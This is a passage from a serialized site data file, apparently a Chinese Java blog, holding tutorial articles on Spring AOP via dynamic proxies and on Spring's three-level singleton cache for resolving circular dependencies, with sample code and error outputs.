等人提出，并在 1997 年发表了经典的论文 aspect-oriented programming。后来，aspectj 成为了 java 生态中使用最广泛的 aop 框架之一。\n\naop 的目的是为了解决在 oop（面向对象编程）中难以处理的横切关注点问题，即将系统业务逻辑代码与其他非业务功能（如日志记录、性能统计、安全控制等）分离开来。aop 通过把这些非业务功能独立出来，在需要时动态地植入到系统中，从而实现对业务逻辑的无侵入式增强。\n\naop 的核心在于其能够将业务逻辑与非业务功能分离开来，从而降低了代码的耦合度，并且支持在运行时动态地植入和移除切面。这样一来，就可以实现更加灵活、可维护和可扩展的系统。\n\naop 的具体表现包括切面（aspect）、连接点（join point）、通知（advice）、切点（pointcut）和引入（introduction）等概念。其中，切面是指横跨多个对象的通用功能，连接点是程序执行过程中能够插入切面的点，通知则是定义了切面在连接点处所执行的操作，切点则是一个谓词表达式，用于匹配连接点，引入则是为某个对象添加新的接口实现。具体如下代码：\n\n    public void test_proxy_method() {\n        // 目标对象(可以替换成任何的目标对象)\n        object targetobj = new userservice();\n        // aop 代理\n        iuserservice proxy = (iuserservice) proxy.newproxyinstance(thread.currentthread().getcontextclassloader(), targetobj.getclass().getinterfaces(), new invocationhandler() {\n            // 方法匹配器\n            methodmatcher methodmatcher = new aspectjexpressionpointcut("execution(* cn.bugstack.springframework.test.bean.iuserservice.*(..))");\n            @override\n            public object invoke(object proxy, method method, object[] args) throws throwable {\n                if (methodmatcher.matches(method, targetobj.getclass())) {\n                    // 方法拦截器\n                    methodinterceptor methodinterceptor = invocation -> {\n                        long start = system.currenttimemillis();\n                        try {\n                            return invocation.proceed();\n                        } finally {\n                            system.out.println("监控 - begin by aop");\n                            system.out.println("方法名称：" + invocation.getmethod().getname());\n                            system.out.println("方法耗时：" + (system.currenttimemillis() - start) + "ms");\n                            system.out.println("监控 - end\\r\\n");\n                        }\n                    };\n                    // 反射调用\n                    return methodinterceptor.invoke(new reflectivemethodinvocation(targetobj, method, args));\n                }\n                return method.invoke(targetobj, args);\n            }\n        });\n        string result = proxy.queryuserinfo();\n        system.out.println("测试结果：" + result);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n这段代码使用了 jdk 动态代理实现 aop 的功能，没有使用 spring 提供的方法、类和注解等。\n\n * 连接点：连接点是在目标对象上匹配的特定点，这里的连接点是 iuserservice 接口中的所有方法，由于使用了 targetobj.getclass ().getinterfaces () 获取目标对象所实现的接口，因此只拦截了 iuserservice 接口中的方法。\n * 切面：切面是一个模块化的横切关注点，在这里我们可以视为没有显式定义的切面。而是直接在 invocationhandler.invoke () 中实现了拦截和增强逻辑，包括方法匹配器、方法拦截器和反射调用等。\n * 切点：切点是一种谓词表达式，用于匹配连接点。这里使用了 aspectj 表达式 "execution (* cn.bugstack.springframework.test.bean.iuserservice.*(..))"，它匹配了 iuserservice 接口中的所有方法。\n * 通知：通知类型包括前置通知、后置通知、环绕通知、抛出通知和最终通知。在这里使用了环绕通知，即在方法执行之前和之后添加了监控逻辑。\n * 引入：引介通常是一个特殊的通知类型，它允许在运行时为类动态地添加新接口实现。这里没有使用引介。\n\n\n# 封装\n\n在 spring 中，核心逻辑是离不开上面的代理例子的，只是相对应做了些封装，我们先用类图来简单说明下封装关系：\n\n\n\n用测试例子来说明每步的核心\n\n    /**\n     * 切点表达式，来验证切点\n     * @throws nosuchmethodexception\n     */\n    @test\n    public void test_aop() throws nosuchmethodexception {\n        aspectjexpressionpointcut pointcut = new aspectjexpressionpointcut("execution(* cn.bugstack.springframework.test.bean.userservice.*(..))");\n        class<userservice> clazz = userservice.class;\n        method method = clazz.getdeclaredmethod("queryuserinfo");\n        system.out.println("切点是否包含该类：" + pointcut.matches(clazz));\n        system.out.println("切点是否包含该类该方法：" + pointcut.matches(method, clazz));\n    }\n\n    /**\n     * 切面 和 动态代理\n     */\n    @test\n    public void test_dynamic() {\n        // 目标对象\n        iuserservice userservice = new userservice();\n        // 组装代理信息，切面\n        advisedsupport advisedsupport = new advisedsupport();\n        // 设置代理目标对象\n        advisedsupport.settargetsource(new targetsource(userservice));\n        // 设置拦截器\n        advisedsupport.setmethodinterceptor(new userserviceinterceptor());\n        // 匹配代理对象\n        advisedsupport.setmethodmatcher(new aspectjexpressionpointcut("execution(* cn.bugstack.springframework.test.bean.iuserservice.*(..))"));\n        // 代理对象(jdkdynamicaopproxy)\n        iuserservice proxy_jdk = (iuserservice) new jdkdynamicaopproxy(advisedsupport).getproxy();\n        // 测试调用\n        system.out.println("测试结果：" + proxy_jdk.queryuserinfo());\n        // 代理对象(cglib2aopproxy)\n        iuserservice proxy_cglib = (iuserservice) new cglib2aopproxy(advisedsupport).getproxy();\n        // 测试调用\n        system.out.println("测试结果：" + proxy_cglib.register("花花"));\n    }\n\npublic class userserviceinterceptor implements methodinterceptor {\n    @override\n    public object invoke(methodinvocation invocation) throws throwable {\n        long start = system.currenttimemillis();\n        try {\n            return invocation.proceed();\n        } finally {\n            system.out.println("监控 - begin by aop");\n            system.out.println("方法名称：" + invocation.getmethod());\n            system.out.println("方法耗时：" + (system.currenttimemillis() - start) + "ms");\n            system.out.println("监控 - end\\r\\n");\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n\n\n\n# 把封装的融入到 spring 中\n\n右侧部分就是描述了整个融合到 spring 中的类，会在 bean 创建的过程中 初始化方法之后 这个生命周期内先找到是否提供了 defaultadvisorautoproxycreator 类的支持，因为他描述了具体代理类的过程。\n\n> 为什么会在初始化方法之后才进行代理，是因为代理类也需要的属性也需要被填充，所以等填充完毕后在代理\n\n\n\n核心方法，描述了整个类被代理的过程\n\n    protected object wrapifnecessary(object bean, string beanname) {\n        // 判断bean是否是advice，pointcut，advisor的子类或者两类相同可以相互转（类层面），用户定义的类都是 false\n        if (isinfrastructureclass(bean.getclass())) return bean;\n        // 得到注册的aspectjexpressionpointcutadvisor\n        collection<aspectjexpressionpointcutadvisor> advisors = beanfactory.getbeansoftype(aspectjexpressionpointcutadvisor.class).values();\n        for (aspectjexpressionpointcutadvisor advisor : advisors) {\n            classfilter classfilter = advisor.getpointcut().getclassfilter();\n            // 用表达式 过滤匹配类\n            if (!classfilter.matches(bean.getclass())) continue;\n            // 封装\n            advisedsupport advisedsupport = new advisedsupport();\n            targetsource targetsource = new targetsource(bean);\n            advisedsupport.settargetsource(targetsource);\n            advisedsupport.setmethodinterceptor((methodinterceptor) advisor.getadvice());\n            advisedsupport.setmethodmatcher(advisor.getpointcut().getmethodmatcher());\n            advisedsupport.setproxytargetclass(true);\n            // 返回代理对象\n            return new proxyfactory(advisedsupport).getproxy();\n        }\n        return bean;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n<beans>\n    \x3c!-- 目标类 --\x3e\n    <bean id="userservice" class="cn.bugstack.springframework.test.bean.userservice"/>\n    \x3c!-- 代理类 --\x3e\n    <bean id="beforeadvice" class="cn.bugstack.springframework.test.bean.userservicebeforeadvice"/>\n    \x3c!-- 组件类，至关重要 --\x3e\n    <bean class="cn.bugstack.springframework.aop.framework.autoproxy.defaultadvisorautoproxycreator"/>\n    \x3c!-- \n        这里是  advisedsupport.setmethodinterceptor((methodinterceptor) advisor.getadvice()); 设置拦截器，\n        可以是前置拦截，后置拦截，或者环绕拦截\n     --\x3e\n    <bean id="methodinterceptor" class="cn.bugstack.springframework.aop.framework.adapter.methodbeforeadviceinterceptor">\n        <property name="advice" ref="beforeadvice"/>\n    </bean>\n    \x3c!-- 切面表达式 --\x3e\n    <bean id="pointcutadvisor" class="cn.bugstack.springframework.aop.aspectj.aspectjexpressionpointcutadvisor">\n        <property name="expression" value="execution(* cn.bugstack.springframework.test.bean.iuserservice.*(..))"/>\n        <property name="advice" ref="methodinterceptor"/>\n    </bean>\n</beans>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n',charsets:{cjk:!0}},{title:"核心内容拆解 三级缓存",frontmatter:{title:"核心内容拆解 三级缓存",date:"2023-06-25T09:22:36.000Z",permalink:"/spring/spring/203/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E6%A1%86%E6%9E%B6/01.Spring/01.spring/203.%E6%A0%B8%E5%BF%83%E5%86%85%E5%AE%B9%E6%8B%86%E8%A7%A3%20%E4%B8%89%E7%BA%A7%E7%BC%93%E5%AD%98.html",relativePath:"01.框架/01.Spring/01.spring/203.核心内容拆解 三级缓存.md",key:"v-6ae9c5a4",path:"/spring/spring/203/",headers:[{level:2,title:"代码介绍",slug:"代码介绍",normalizedTitle:"代码介绍",charIndex:679},{level:2,title:"流程介绍",slug:"流程介绍",normalizedTitle:"流程介绍",charIndex:7320},{level:2,title:"不同的循环依赖问题",slug:"不同的循环依赖问题",normalizedTitle:"不同的循环依赖问题",charIndex:10231},{level:3,title:"set 循环依赖",slug:"set-循环依赖",normalizedTitle:"set 循环依赖",charIndex:10245},{level:3,title:"构造器 循环依赖",slug:"构造器-循环依赖",normalizedTitle:"构造器 循环依赖",charIndex:11894},{level:3,title:"@DependsOn",slug:"dependson",normalizedTitle:"@dependson",charIndex:14419}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"代码介绍 流程介绍 不同的循环依赖问题 set 循环依赖 构造器 循环依赖 @DependsOn",content:"Spring 三级缓存是 Spring 框架中用于管理 Bean 对象的缓存机制。它由三个不同的缓存区域组成，分别是 singletonObjects、earlySingletonObjects 和 singletonFactories。\n\n * singletonObjects（一级缓存，成品对象）：单例对象缓存区域存储已经完全初始化后的单例对象。当第一次使用 getBean () 方法获取 bean 时，Spring 会尝试从这个缓存区获取对象，如果能够找到，则直接返回该对象实例。\n * earlySingletonObjects（二级缓存，代理对象，特殊的成品对象）：如果一个单例对象需要引用另一个单例对象，但后者尚未被完全初始化，那么容器将创建一个代理对象（Proxy Object），并将其放到 earlySingletonObjects 中。这个代理对象会暴露与实际对象相同的接口，并且能够对其进行一些基本操作，但是它还没有被完全初始化。\n * singletonFactories（三级缓存，半成品对象也是工厂对象）：单例工厂缓存区域存储创建 bean 实例的 ObjectFactory。在 Bean 依赖关系的创建过程中，如果 A 依赖 B，B 又依赖 A，那么在创建 A 和 B 的过程中就会出现循环依赖的问题。Spring 就是通过提前暴露一个未完成初始化的 Bean 来解决这个问题的。\n\n提示\n\n对于 spring 设计没有完全理解的同学可能很难明白以上的话，还是需要用代码加一说明，以下文章会议代码的方式全程讲清楚\n\n\n# 代码介绍\n\n首先 Spring 在初始化的时候会先把所有 Bean 加载到 Beandefinition 的缓存中，后续所有对 Bean 的创建都是从 Beandefinition 中获取详细可以看 Spring 源码阅读（一） ，然后再进行 Bean 生命周期的过程，创建好 Bean 的实例放入到 singletonObjects 缓存中，但是代码的第一步都是从获取开始，只有获取不到我才创建\n\n    public Object getBean(String name) throws BeansException {\n        return doGetBean(name, null);\n    }\n\n    public Object getBean(String name, Object... args) throws BeansException {\n        return doGetBean(name, args);\n    }\n\n    public <T> T getBean(String name, Class<T> requiredType) throws BeansException {\n        return (T) getBean(name);\n    }\n\n    protected <T> T doGetBean(final String name, final Object[] args) {\n        // 从缓存中获取实例\n        Object sharedInstance = getSingleton(name);\n        if (sharedInstance != null) {\n            // 如果实现了 FactoryBean，则需要调用 FactoryBean#getObject\n            return (T) getObjectForBeanInstance(sharedInstance, name);\n        }\n        // 从BeanDefinition列表中获取对象\n        BeanDefinition beanDefinition = getBeanDefinition(name);\n        // Bean实例的创建过程\n        Object bean = doCreateBean(name, beanDefinition, args);\n        // 如果实现了 FactoryBean，则需要调用 FactoryBean#getObject\n        return (T) getObjectForBeanInstance(bean, name);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n可以看到 getSingleton 方法就是获取单例，一旦有则直接返回，但第一次肯定是没有的，详细看下他的获取方式\n\n    public Object getSingleton(String beanName) {\n        // 从一级缓存中获取\n        Object singletonObject = singletonObjects.get(beanName);\n        if (null == singletonObject) {\n            singletonObject = earlySingletonObjects.get(beanName);\n            // 判断二级缓存中是否有对象，这个对象就是代理对象，因为只有代理对象才会放到三级缓存中\n            if (null == singletonObject) {\n                ObjectFactory<?> singletonFactory = singletonFactories.get(beanName);\n                if (singletonFactory != null) {\n                    singletonObject = singletonFactory.getObject();\n                    // 把三级缓存中的代理对象中的真实对象获取出来，放入二级缓存中\n                    earlySingletonObjects.put(beanName, singletonObject);\n                    singletonFactories.remove(beanName);\n                }\n            }\n        }\n        return singletonObject;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n没有获取到实例则从 beanDefinition 中获取 Bean 的定义信息调用 doCreateBean 创建 Bean 的实例\n\n    protected Object doCreateBean(String beanName, BeanDefinition beanDefinition, Object[] args) {\n        Object bean = null;\n        try {\n            // 实例化 Bean\n            bean = createBeanInstance(beanDefinition, beanName, args);\n            // 处理循环依赖，将实例化后的Bean对象提前放入缓存中暴露出来\n            if (beanDefinition.isSingleton()) {\n                Object finalBean = bean;\n                addSingletonFactory(beanName, () -> getEarlyBeanReference(beanName, beanDefinition, finalBean));\n            }\n            // 是否需要继续进行后续的属性填充\n            boolean continueWithPropertyPopulation = applyBeanPostProcessorsAfterInstantiation(beanName, bean);\n            if (!continueWithPropertyPopulation) {\n                return bean;\n            }\n            // 在设置 Bean 属性之前，允许 BeanPostProcessor 修改属性值（注解属性填充）\n            applyBeanPostProcessorsBeforeApplyingPropertyValues(beanName, bean, beanDefinition);\n            // 给 Bean 填充属性（xml属性填充）\n            applyPropertyValues(beanName, bean, beanDefinition);\n            // 执行 Bean 的初始化方法和 BeanPostProcessor 的前置和后置处理方法\n            bean = initializeBean(beanName, bean, beanDefinition);\n        } catch (Exception e) {\n            throw new BeansException(\"Instantiation of bean failed\", e);\n        }\n        // 注册实现了 DisposableBean 接口的 Bean 对象\n        registerDisposableBeanIfNecessary(beanName, bean, beanDefinition);\n        // 判断 SCOPE_SINGLETON、SCOPE_PROTOTYPE\n        Object exposedObject = bean;\n        if (beanDefinition.isSingleton()) {\n            // 获取代理对象\n            exposedObject = getSingleton(beanName);\n            registerSingleton(beanName, exposedObject);\n        }\n        return exposedObject;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n\n\n其中 applyPropertyValues 这个方法，对要创建的实例进行属性填充的时候会进入循环依赖的问题，一旦遇到是 BeanReference 类型的，则会调用 getBean 方法去获取实例，该方法又会回到上面的方法。\n\n    protected void applyPropertyValues(String beanName, Object bean, BeanDefinition beanDefinition) {\n        try {\n            // 这里获取到  bean 信息里的属性有哪些，也就是一个对象有哪些属性，并循环赋值到所创建实例的属性中去\n            PropertyValues propertyValues = beanDefinition.getPropertyValues();\n            for (PropertyValue propertyValue : propertyValues.getPropertyValues()) {\n                String name = propertyValue.getName();\n                Object value = propertyValue.getValue();\n                if (value instanceof BeanReference) {\n                    // A 依赖 B，获取 B 的实例化\n                    BeanReference beanReference = (BeanReference) value;\n                    value = getBean(beanReference.getBeanName());\n                }\n                // 类型转换，不是侧重点可以不看\n                else {\n                    Class<?> sourceType = value.getClass();\n                    Class<?> targetType = (Class<?>) TypeUtil.getFieldType(bean.getClass(), name);\n                    ConversionService conversionService = getConversionService();\n                    if (conversionService != null) {\n                        if (conversionService.canConvert(sourceType, targetType)) {\n                            value = conversionService.convert(value, targetType);\n                        }\n                    }\n                }\n                // 反射设置属性填充\n                 BeanUtil.setFieldValue(bean, name, value);\n            }\n        } catch (Exception e) {\n            throw new BeansException(\"Error setting property values：\" + beanName + \" message：\" + e);\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n\n\n当一个实例的创建基本完成，他会把自己添加到一级缓存对象，做为一个成品提供给其他方法使用。如下方法就是添加到一级缓存的过程，其中 getSingleton 在获取三级缓存数据到二级缓存的时候会执行 singletonFactory.getObject (); 这是一个方法，会去执行 getEarlyBeanReference (beanName, beanDefinition, finalBean) 方法，该方法会得到工厂方法里面的一个代理对象。然后再把代理对象存到一级缓存。至此 Bean 的实例化到缓存的过程就结束。\n\n// 判断 SCOPE_SINGLETON、SCOPE_PROTOTYPE\nObject exposedObject = bean;\nif (beanDefinition.isSingleton()) {\n    // 把三级缓存对象转换为二级缓存对象\n    exposedObject = getSingleton(beanName);\n    // 把二级缓存对象转换为一级缓存对象\n    registerSingleton(beanName, exposedObject);\n}\n\n// getSingleton 的部分代码实现\nObjectFactory<?> singletonFactory = singletonFactories.get(beanName);\nif (singletonFactory != null) {\n    // 获取代理对象\n    singletonObject = singletonFactory.getObject();\n    // 把三级缓存中的代理对象中的真实对象获取出来，放入二级缓存中\n    earlySingletonObjects.put(beanName, singletonObject);\n    singletonFactories.remove(beanName);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n\n# 流程介绍\n\n有了完整的概念后，我们可以考虑循环依赖的存在，当 A 依赖 B，B 又依赖 A，那么解决依赖的过程又是如何做的，可以看下图：\n\n\n\n 1. 会先在 getBean 方法里面找 A，通过一二三级缓存中寻找，如果找到则直接返回\n 2. 没找到就去创建 A 并放入 singletonFactories 三级缓存，会对 A 的属性值进行填充，此时 A 的属性依赖了 B，就要调用 getBean 找 B\n 3. 通过在 getBean 的 一二三级缓存查找，如果找到了直接返回\n 4. 没找到就去创建 B 并放入 singletonFactories 三级缓存，会对 B 的属性值进行填充，此时 B 的属性依赖了 A，就要调用 getBean 找 A\n 5. 此时的 A 已经在三级缓存，可以在三级缓存中找到，找到后会生成 A 代理对象 放入 earlySingletonObjects 二级缓存并返回这个代理对象\n 6. B 有了属性 A 的代理对象，此时 B 所有属性填充完毕后，就要把 B 添加到一级缓存，但此时的 B 在三级缓存，会先把三级缓存对象生成代理后放入到 earlySingletonObjects 二级缓存，再由二级缓存把对象放到 singletonObjects 一级缓存对象\n 7. 此时的 B 已经放到一级缓存对象了，并结束了 B 的创建流程，所以会返回到第 2 步，A 就有了 B 的实例，A 的属性填充完毕后，就要把 A 添加到一级缓存，但此时的 A 已经在二级缓存，所以就可以直接放入到 singletonObjects 一级缓存\n\n现在我们知道，按照 Spring 框架的设计，用于解决循环依赖需要用到三个缓存，这三个缓存分别存放了 singletonObjects 成品对象、singletonFactories 半成品对象 (未填充属性值)、earlySingletonObjects 代理对象，分阶段存放对象内容，来解决循环依赖问题。\n\n那么，这里我们需要知道一个核心的原理，就是用于解决循环依赖就必须是三级缓存呢，二级行吗？一级可以不？其实都能解决，只不过 Spring 框架的实现要保证几个事情，如只有一级缓存处理流程没法拆分，复杂度也会增加，同时半成品对象可能会有空指针异常。而将半成品与成品对象分开，处理起来也更加优雅、简单、易扩展。另外 Spring 的两大特性中不仅有 IOC 还有 AOP，也就是基于字节码增强后的方法，该存放到哪，而三级缓存最主要，要解决的循环依赖就是对 AOP 的处理，但如果把 AOP 代理对象的创建提前，那么二级缓存也一样可以解决。但是，这就违背了 Spring 创建对象的原则，Spring 更喜欢把所有的普通 Bean 都初始化完成，在处理代理对象的初始化。\n\n一个单个缓存解决循环依赖的例子\n\npublic class ForRelyOn {\n\n    static Map<String,Object> singletonObjects = new HashMap<>();\n\n    public static void main(String[] args) throws Exception {\n        System.out.println(getBean(A.class).getB());\n        System.out.println(getBean(B.class).getA());\n    }\n\n    private static <T> T getBean(Class<T> beanClass) throws Exception {\n        String beanName = beanClass.getSimpleName().toLowerCase();\n        if (singletonObjects.containsKey(beanName)) {\n            return (T) singletonObjects.get(beanName);\n        }\n        // 实例化对象入缓存0\n        Object obj = beanClass.newInstance();\n        singletonObjects.put(beanName, obj);\n        // 属性填充补全对象\n        Field[] fields = obj.getClass().getDeclaredFields();\n        for (Field field : fields) {\n            field.setAccessible(true);\n            Class<?> fieldClass = field.getType();\n            String fieldBeanName = fieldClass.getSimpleName().toLowerCase();\n            field.set(obj, singletonObjects.containsKey(fieldBeanName) ? singletonObjects.get(fieldBeanName) : getBean(fieldClass));\n            field.setAccessible(false);\n        }\n        return (T) obj;\n    }\n\n\n    static class A{\n        private B b;\n\n        public B getB() {\n            return b;\n        }\n\n        public void setB(B b) {\n            this.b = b;\n        }\n    }\n\n    static class B{\n        private A a;\n\n        public A getA() {\n            return a;\n        }\n\n        public void setA(A a) {\n            this.a = a;\n        }\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n\n\n提示\n\n以上都是我们通过 单例的 set 注入方式来解决循环依赖，在 spring 中有多种多样的注入情况，那会带来什么样的情况呢？\n\n\n# 不同的循环依赖问题\n\n\n# set 循环依赖\n\n在多例 set 的循环依赖中，只有多例和多例循环依赖会出现报错，报错信息如下：\n\nError creating bean with name 'b': Injection of resource dependencies failed; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'a': Injection of resource dependencies failed; nested exception is org.springframework.beans.factory.BeanCurrentlyInCreationException: Error creating bean with name 'b': Requested bean is currently in creation: Is there an unresolvable circular reference?\n\n\n1\n\n\n多例和单例的循环依赖不会有问题，如下是一个单例和多例的循环依赖代码：\n\n@Component\npublic class A {\n    @Resource\n    private B b;\n    public void getb() {\n        System.out.println(b);\n    }\n}\n\n@Scope(ConfigurableBeanFactory.SCOPE_PROTOTYPE)\n@Component\npublic class B {\n    @Resource\n    private A a;\n    public void geta(){\n        System.out.println(a);\n    }\n}\n\npublic static void main(String[] args) {\n    ConfigurableApplicationContext run = SpringApplication.run(AdminApplication.class, args);\n    B b = run.getBean(B.class);\n    B b1 = run.getBean(B.class);\n    B b2 = run.getBean(B.class);\n    A a = run.getBean(A.class);\n    A a1 = run.getBean(A.class);\n    A a2 = run.getBean(A.class);\n    System.out.println(b);\n    System.out.println(b1);\n    System.out.println(b2);\n    a.getb();\n    a1.getb();\n    a2.getb();\n}\n\n// 结果\n// com.wt.admin.controller.B@1e5e2e06\n// com.wt.admin.controller.B@26c1f3eb\n// com.wt.admin.controller.B@79982bcc\n// com.wt.admin.controller.B@16b2d182\n// com.wt.admin.controller.B@16b2d182\n// com.wt.admin.controller.B@16b2d182\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n\n\n\n# 构造器 循环依赖\n\n但在 构造器 循环依赖的注入中，因为在构造器注入方式下，需要先创建一个 Bean 对象，然后再将其他 Bean 注入该对象中。但是，如果两个 Bean 都互相依赖，那么就会出现无法创建任何一个 Bean 的情况。因此，Spring 在这种情况下会抛出异常以避免程序出现不可预测的错误。\n\n@Configuration\npublic class Config {\n    @Bean\n    public A a(B b){\n        return new A(b);\n    }\n    @Bean\n    public B b(A a){\n        return new B(a);\n    }\n}\n// 报错\n// The dependencies of some of the beans in the application context form a cycle:\n// ┌─────┐\n// |  a defined in class path resource [com/wt/admin/controller/Config.class]\n// ↑     ↓\n// |  b defined in class path resource [com/wt/admin/controller/Config.class]\n// └─────┘\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n解决这种问题，可以通过在方法中添加 @Lazy 注解，只能加到方法里，不能加到 @Bean 的上下位置，否则依然会报循环依赖；这种方式尽可能的被定义为 @Lazy 的 Bean 在第一次被使用的时候在去进行实例化。\n\n构造器也存在多例和单例的问题，如果你是多例依赖循环，会报错，如下\n\n// 多例\n@Configuration\npublic class Config {\n    @Scope(ConfigurableBeanFactory.SCOPE_PROTOTYPE)\n    @Bean\n    public A a(B b){\n        return new A(b);\n    }\n    @Scope(ConfigurableBeanFactory.SCOPE_PROTOTYPE)\n    @Bean\n    public B b(A a){\n        return new B(a);\n    }\n}\n// 报错信息\n// Error creating bean with name 'b' defined in class path resource [com/wt/admin/controller/Config.class]: Unsatisfied dependency expressed through method 'b' parameter 0; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'a' defined in class path resource [com/wt/admin/controller/Config.class]: Unsatisfied dependency expressed through method 'a' parameter 0; nested exception is org.springframework.beans.factory.BeanCurrentlyInCreationException: Error creating bean with name 'b': Requested bean is currently in creation: Is there an unresolvable circular reference?\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n如果你是多例和单例循环依赖，也会报错，但这里和我们使用注解进行多例和单例的循环依赖测试结果就有所不同了\n\n@Configuration\npublic class Config {\n    @Scope(ConfigurableBeanFactory.SCOPE_PROTOTYPE)\n    @Bean\n    public A a(B b){\n        return new A(b);\n    }\n    @Bean\n    public B b(A a){\n        return new B(a);\n    }\n}\n// 报错信息\n// The dependencies of some of the beans in the application context form a cycle:\n// ┌─────┐\n// |  b defined in class path resource [com/wt/admin/controller/Config.class]\n// ↑     ↓\n// |  a defined in class path resource [com/wt/admin/controller/Config.class]\n// └─────┘\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n那么构造器和 set 注入的方式在多例和单例的结论如下：\n\n * 单例循环依赖：构造器的方式会报错（可以用 @Lazy 解决），set 注入的方式不会报错\n * 多例循环依赖：构造器的方式会报错，set 注入的方式会报错，两者都是调用对象时才报\n * 单例和多例循环依赖：构造器的方式会报错（可以用 @Lazy 解决），set 注入的方式不会报错\n\n\n# @DependsOn\n\n@DependsOn 注解可以定义在类和⽅法上，意思是我这个组件要依赖于另⼀个组件，也就是说被依赖的组件会⽐该组件先注册到 IOC 容器中。如下案例，因为两个都要先于，所以造成了循环依赖\n\n@DependsOn(\"b\")\n@Component\npublic class A {\n    @Resource\n    private B b;\n    public void getb() {\n        System.out.println(b);\n    }\n}\n\n@DependsOn(\"a\")\n@Component\npublic class B {\n    @Resource\n    private A a;\n    public void geta(){\n        System.out.println(a);\n    }\n}\n// 报错\n// Error creating bean with name 'b' defined in file [D:\\workspace\\luckyDraw\\java\\target\\classes\\com\\wt\\admin\\controller\\B.class]: Circular depends-on relationship between 'b' and 'a'\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n",normalizedContent:"spring 三级缓存是 spring 框架中用于管理 bean 对象的缓存机制。它由三个不同的缓存区域组成，分别是 singletonobjects、earlysingletonobjects 和 singletonfactories。\n\n * singletonobjects（一级缓存，成品对象）：单例对象缓存区域存储已经完全初始化后的单例对象。当第一次使用 getbean () 方法获取 bean 时，spring 会尝试从这个缓存区获取对象，如果能够找到，则直接返回该对象实例。\n * earlysingletonobjects（二级缓存，代理对象，特殊的成品对象）：如果一个单例对象需要引用另一个单例对象，但后者尚未被完全初始化，那么容器将创建一个代理对象（proxy object），并将其放到 earlysingletonobjects 中。这个代理对象会暴露与实际对象相同的接口，并且能够对其进行一些基本操作，但是它还没有被完全初始化。\n * singletonfactories（三级缓存，半成品对象也是工厂对象）：单例工厂缓存区域存储创建 bean 实例的 objectfactory。在 bean 依赖关系的创建过程中，如果 a 依赖 b，b 又依赖 a，那么在创建 a 和 b 的过程中就会出现循环依赖的问题。spring 就是通过提前暴露一个未完成初始化的 bean 来解决这个问题的。\n\n提示\n\n对于 spring 设计没有完全理解的同学可能很难明白以上的话，还是需要用代码加一说明，以下文章会议代码的方式全程讲清楚\n\n\n# 代码介绍\n\n首先 spring 在初始化的时候会先把所有 bean 加载到 beandefinition 的缓存中，后续所有对 bean 的创建都是从 beandefinition 中获取详细可以看 spring 源码阅读（一） ，然后再进行 bean 生命周期的过程，创建好 bean 的实例放入到 singletonobjects 缓存中，但是代码的第一步都是从获取开始，只有获取不到我才创建\n\n    public object getbean(string name) throws beansexception {\n        return dogetbean(name, null);\n    }\n\n    public object getbean(string name, object... args) throws beansexception {\n        return dogetbean(name, args);\n    }\n\n    public <t> t getbean(string name, class<t> requiredtype) throws beansexception {\n        return (t) getbean(name);\n    }\n\n    protected <t> t dogetbean(final string name, final object[] args) {\n        // 从缓存中获取实例\n        object sharedinstance = getsingleton(name);\n        if (sharedinstance != null) {\n            // 如果实现了 factorybean，则需要调用 factorybean#getobject\n            return (t) getobjectforbeaninstance(sharedinstance, name);\n        }\n        // 从beandefinition列表中获取对象\n        beandefinition beandefinition = getbeandefinition(name);\n        // bean实例的创建过程\n        object bean = docreatebean(name, beandefinition, args);\n        // 如果实现了 factorybean，则需要调用 factorybean#getobject\n        return (t) getobjectforbeaninstance(bean, name);\n    